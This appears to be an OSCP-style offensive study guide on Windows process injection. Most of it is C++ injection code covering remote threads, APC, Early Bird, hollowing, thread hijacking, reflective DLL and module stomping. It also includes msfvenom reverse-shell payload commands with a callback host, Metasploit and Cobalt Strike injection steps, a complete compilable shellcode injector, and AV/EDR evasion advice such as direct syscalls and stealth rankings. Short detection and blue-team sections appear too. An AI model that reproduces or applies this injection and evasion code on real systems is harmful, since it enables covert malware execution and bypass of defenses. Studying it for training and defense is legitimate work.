# Process & Code Injection Techniques

Complete guide for injecting code into processes - essential for AV/EDR evasion and post-exploitation.

---

## Table of Contents
1. [Shellcode Injection](#1-shellcode-injection)
2. [DLL Injection](#2-dll-injection)
3. [Process Manipulation](#3-process-manipulation)
4. [Memory Mapping Techniques](#4-memory-mapping-techniques)
5. [Advanced Injection](#5-advanced-injection)
6. [Detection & Defense](#6-detection--defense)

---

## 1. Shellcode Injection

### 1.1 CreateRemoteThread Injection (Classic)

**Theory:**
- Allocate memory in target process
- Write shellcode to allocated memory
- Create remote thread to execute shellcode

**Steps:**
```cpp
// 1. Open target process
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);

// 2. Allocate memory in remote process
LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 3. Write shellcode to remote process
WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL);

// 4. Create remote thread
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                    (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
```

**Detection:**
- Sysmon Event ID 8 (CreateRemoteThread)
- Suspicious RWX memory allocations

**OSCP Usage:**
```bash
# Generate shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.100 LPORT=443 -f c

# Compile custom injector with shellcode
# Target: explorer.exe, notepad.exe (common processes)
```

---

### 1.2 APC Queue Injection

**Theory:**
- Queue Asynchronous Procedure Call (APC) to target thread
- Shellcode executes when thread enters alertable state
- Stealthier than CreateRemoteThread

**Steps:**
```cpp
// 1. Enumerate threads of target process
THREADENTRY32 te32;
Thread32First(hSnapshot, &te32);

// 2. Open thread
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadID);

// 3. Allocate & write shellcode (same as CreateRemoteThread)
VirtualAllocEx(...);
WriteProcessMemory(...);

// 4. Queue APC
QueueUserAPC((PAPCFUNC)remoteBuffer, hThread, 0);
```

**Detection:**
- Less suspicious than CreateRemoteThread
- No Sysmon Event ID 8
- Still triggers memory allocation alerts

---

### 1.3 Early Bird APC Injection

**Theory:**
- Create process in suspended state
- Queue APC before process starts
- Resume process → shellcode executes before main thread

**Advantages:**
- Evades many EDR hooks (process hasn't loaded DLLs yet)
- No remote thread creation

**Steps:**
```cpp
// 1. Create suspended process
CreateProcess(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE,
              CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Allocate & write shellcode
VirtualAllocEx(pi.hProcess, ...);
WriteProcessMemory(pi.hProcess, ...);

// 3. Queue APC to main thread
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, 0);

// 4. Resume thread
ResumeThread(pi.hThread);
```

**OSCP Relevance:** Bypasses many AV solutions

---

### 1.4 QueueUserAPC + NtTestAlert (Local)

**Theory:**
- Inject shellcode into current process
- Use NtTestAlert to force APC execution

```cpp
// 1. Allocate local memory
LPVOID localBuffer = VirtualAlloc(NULL, sizeof(shellcode),
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 2. Write shellcode
memcpy(localBuffer, shellcode, sizeof(shellcode));

// 3. Queue APC to current thread
QueueUserAPC((PAPCFUNC)localBuffer, GetCurrentThread(), 0);

// 4. Trigger execution
NtTestAlert();
```

---

### 1.5 Fiber-Based Execution

**Theory:**
- Fibers are lightweight threads managed in userland
- CreateFiber can execute shellcode without creating threads

```cpp
// 1. Convert current thread to fiber
ConvertThreadToFiber(NULL);

// 2. Allocate & write shellcode
LPVOID fiberBuffer = VirtualAlloc(...);
memcpy(fiberBuffer, shellcode, sizeof(shellcode));

// 3. Create fiber
LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)fiberBuffer, NULL);

// 4. Switch to fiber
SwitchToFiber(fiber);
```

**Detection:** Very low - no thread creation, minimal API calls

---

### 1.6 Thread Pool Injection

**Theory:**
- Use CreateThreadpoolWait instead of CreateThread
- Less monitored API

```cpp
// 1. Allocate & write shellcode
LPVOID remoteBuffer = VirtualAllocEx(...);
WriteProcessMemory(...);

// 2. Create event
HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

// 3. Create thread pool wait
PTP_WAIT wait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)remoteBuffer, NULL, NULL);

// 4. Set and trigger
SetThreadpoolWait(wait, hEvent, NULL);
SetEvent(hEvent);
```

---

## 2. DLL Injection

### 2.1 Classic DLL Injection (LoadLibrary)

**Steps:**
```cpp
// 1. Get LoadLibraryA address (same across all processes)
LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

// 2. Allocate memory for DLL path
LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, strlen(dllPath),
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// 3. Write DLL path
WriteProcessMemory(hProcess, remoteBuffer, dllPath, strlen(dllPath), NULL);

// 4. Create remote thread with LoadLibraryA
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, remoteBuffer, 0, NULL);
```

**Tools:**
```bash
# Metasploit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.100 LPORT=443 -f dll -o payload.dll

# Inject with custom tool or:
msfconsole
use exploit/windows/local/payload_inject
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set DLL /path/to/payload.dll
set PID 1234
run
```

**Detection:**
- Sysmon Event ID 7 (DLL Load)
- Unsigned/suspicious DLL paths

---

### 2.2 Reflective DLL Injection

**Theory:**
- DLL loads itself without LoadLibrary
- No disk write required
- Bypasses DLL whitelisting

**Process:**
1. DLL implements custom loader (ReflectiveLoader)
2. Allocate memory in target process
3. Write entire DLL to memory
4. Execute ReflectiveLoader function
5. DLL relocates itself and resolves imports

**Tools:**
```bash
# PowerSploit
Import-Module .\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId 1234

# Cobalt Strike
dllinject <PID> C:\path\to\reflective.dll
```

**OSCP Tip:** Use for in-memory Mimikatz

---

### 2.3 Module Stomping

**Theory:**
- Load legitimate DLL (e.g., amsi.dll)
- Overwrite its memory with malicious code
- Maintains legitimate module name in memory

```cpp
// 1. Load benign DLL
HMODULE hModule = LoadLibrary("amsi.dll");

// 2. Change protection
VirtualProtect(hModule, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);

// 3. Overwrite module
memcpy(hModule, shellcode, sizeof(shellcode));

// 4. Execute
((void(*)())hModule)();
```

---

## 3. Process Manipulation

### 3.1 Process Hollowing

**Theory:**
- Create legitimate process in suspended state
- Unmap its memory
- Write malicious code
- Resume process

**Steps:**
```cpp
// 1. Create suspended process
CreateProcess(NULL, "C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);

// 2. Unmap original image
NtUnmapViewOfSection(pi.hProcess, baseAddress);

// 3. Allocate new memory
VirtualAllocEx(pi.hProcess, baseAddress, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 4. Write malicious PE
WriteProcessMemory(pi.hProcess, baseAddress, maliciousPE, imageSize, NULL);

// 5. Set entry point
SetThreadContext(pi.hThread, &ctx);

// 6. Resume
ResumeThread(pi.hThread);
```

**Detection:**
- Process image path mismatch
- Suspicious memory regions

**OSCP Usage:** Evade process-based detection

---

### 3.2 Process Doppelgänging

**Theory:**
- Uses NTFS transactions to load malicious code
- Transactional NTFS (TxF) abuse
- Very stealthy (no disk artifacts after execution)

**Steps:**
1. Create TxF transaction
2. Write malicious PE to transacted file
3. Create section from transacted file
4. Rollback transaction (file disappears)
5. Create process from section

**Complexity:** High - requires Windows internals knowledge

---

### 3.3 Thread Hijacking

**Theory:**
- Suspend thread in target process
- Modify thread context (RIP) to point to shellcode
- Resume thread

```cpp
// 1. Suspend thread
SuspendThread(hThread);

// 2. Get context
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(hThread, &ctx);

// 3. Allocate & write shellcode
VirtualAllocEx(...);
WriteProcessMemory(...);

// 4. Modify RIP to shellcode
ctx.Rip = (DWORD64)remoteBuffer;
SetThreadContext(hThread, &ctx);

// 5. Resume
ResumeThread(hThread);
```

**Advantage:** No new thread/process creation

---

## 4. Memory Mapping Techniques

### 4.1 NtCreateSection + NtMapViewOfSection

**Theory:**
- Native API alternative to VirtualAllocEx + WriteProcessMemory
- Create shared memory section
- Map into both processes

```cpp
// 1. Create section
HANDLE hSection;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

// 2. Map into current process
PVOID localView;
NtMapViewOfSection(hSection, GetCurrentProcess(), &localView, ...);

// 3. Write shellcode
memcpy(localView, shellcode, sizeof(shellcode));

// 4. Map into remote process
PVOID remoteView;
NtMapViewOfSection(hSection, hProcess, &remoteView, ...);

// 5. Execute via CreateRemoteThread
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteView, NULL, 0, NULL);
```

**Advantage:** Bypasses EDRs hooking VirtualAllocEx

---

### 4.2 PE Injection (Manual Mapping)

**Theory:**
- Manually map entire PE file into target process
- Resolve imports and relocations manually
- Execute entry point

**Use Case:** Inject full executables, not just shellcode

---

## 5. Advanced Injection

### 5.1 SetWindowsHookEx Injection

**Theory:**
- Set global hook (keyboard, mouse, etc.)
- DLL loaded into all processes with message queues

```cpp
HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hDll, 0);
```

**OSCP Limitation:** Requires GUI processes

---

### 5.2 AddressOfEntryPoint Injection

**Theory:**
- Inject shellcode
- Modify PE Entry Point to execute shellcode first
- No RWX memory needed (uses existing executable memory)

---

### 5.3 IAT Hooking

**Theory:**
- Modify Import Address Table
- Redirect function calls to malicious code

```cpp
// 1. Find IAT entry for target function
PIMAGE_IMPORT_DESCRIPTOR importDesc = ...;

// 2. Change protection
VirtualProtect(iatEntry, sizeof(PVOID), PAGE_READWRITE, &oldProtect);

// 3. Replace function pointer
*iatEntry = (PVOID)maliciousFunction;

// 4. Restore protection
VirtualProtect(iatEntry, sizeof(PVOID), oldProtect, &oldProtect);
```

---

## 6. Detection & Defense

### 6.1 Common Indicators

**Memory Indicators:**
- RWX (Read-Write-Execute) memory regions
- Private memory not backed by files
- Unbacked executable memory

**API Indicators:**
- VirtualAllocEx with PAGE_EXECUTE_READWRITE
- WriteProcessMemory to executable memory
- CreateRemoteThread to non-module addresses
- NtMapViewOfSection with executable permissions

**Behavioral:**
- Unsigned code execution
- Shellcode patterns in memory
- Suspicious cross-process activity

### 6.2 Evasion Techniques

**Memory Protection:**
```cpp
// Use RW → RX instead of RWX
VirtualAllocEx(..., PAGE_READWRITE);  // Initially RW
WriteProcessMemory(...);
VirtualProtectEx(..., PAGE_EXECUTE_READ);  // Change to RX
```

**API Alternatives:**
- Use Native API (Nt*/Zw*) instead of Win32
- Direct syscalls (bypass userland hooks)
- Use legitimate APIs (e.g., CreateThreadpoolWait)

**Process Selection:**
- Target long-running processes (explorer.exe, svchost.exe)
- Match process architecture (x64 → x64)
- Avoid highly monitored processes (lsass.exe)

---

## 7. OSCP Practical Examples

### Example 1: Simple Shellcode Injector

```cpp
#include <windows.h>
#include <stdio.h>

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=443 -f c
unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0...";

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD pid = atoi(argv[1]);

    // Open process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("OpenProcess failed: %d\n", GetLastError());
        return 1;
    }

    // Allocate memory
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Write shellcode
    WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL);

    // Execute
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

**Compile:**
```bash
# On Windows with MinGW
x86_64-w64-mingw32-gcc injector.c -o injector.exe

# Or Visual Studio
cl.exe injector.c
```

**Usage:**
```cmd
# Get PID
tasklist | findstr explorer.exe

# Inject
injector.exe 1234
```

---

### Example 2: PowerShell Reflective Injection

```powershell
# Invoke-ReflectivePEInjection.ps1 (PowerSploit)
$PEBytes = [IO.File]::ReadAllBytes("C:\payload.dll")
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName explorer
```

---

## 8. Defense Recommendations

**For Blue Team:**
1. Monitor Sysmon Event IDs: 8 (CreateRemoteThread), 10 (OpenProcess)
2. Alert on RWX memory allocations
3. Use CFG (Control Flow Guard) and ACG (Arbitrary Code Guard)
4. Implement WDAC (Windows Defender Application Control)
5. Enable AMSI for PowerShell/script-based injection

**For Pentesters:**
- Test evasion in controlled environment first
- Use obfuscation for custom tools
- Prefer native binaries over custom injectors when possible
- Clean up artifacts (close handles, free memory)

---

## 9. Tools Summary

| Tool | Type | Use Case |
|------|------|----------|
| **Metasploit** | Framework | payload_inject, migrate |
| **Cobalt Strike** | C2 | dllinject, shinject |
| **PowerSploit** | PowerShell | Invoke-ReflectivePEInjection |
| **ProcessHacker** | GUI | Manual injection testing |
| **Donut** | Generator | Position-independent shellcode |
| **sRDI** | Tool | Reflective DLL conversion |

---

## 10. Quick Reference

### Stealthiness Ranking (Low to High Detection)
1. Early Bird APC
2. Fiber Execution
3. Thread Pool Injection
4. APC Queue Injection
5. Process Hollowing
6. Classic CreateRemoteThread
7. DLL Injection (LoadLibrary)

### OSCP Priority
1. ✅ CreateRemoteThread (understand fundamentals)
2. ✅ DLL Injection (Mimikatz, payloads)
3. ✅ Process Hollowing (AV evasion)
4. ⚠️ Reflective DLL (advanced payloads)
5. ⚠️ APC Injection (EDR bypass)

---

## References
- Red Team Notes: https://www.ired.team/offensive-security/code-injection-process-injection
- MITRE ATT&CK: T1055 (Process Injection)
- Windows Internals Book (Russinovich)
- Malware Development Series

---

**OSCP Exam Note:** Focus on understanding CreateRemoteThread and DLL Injection. Have pre-compiled injector ready for AV bypass scenarios.
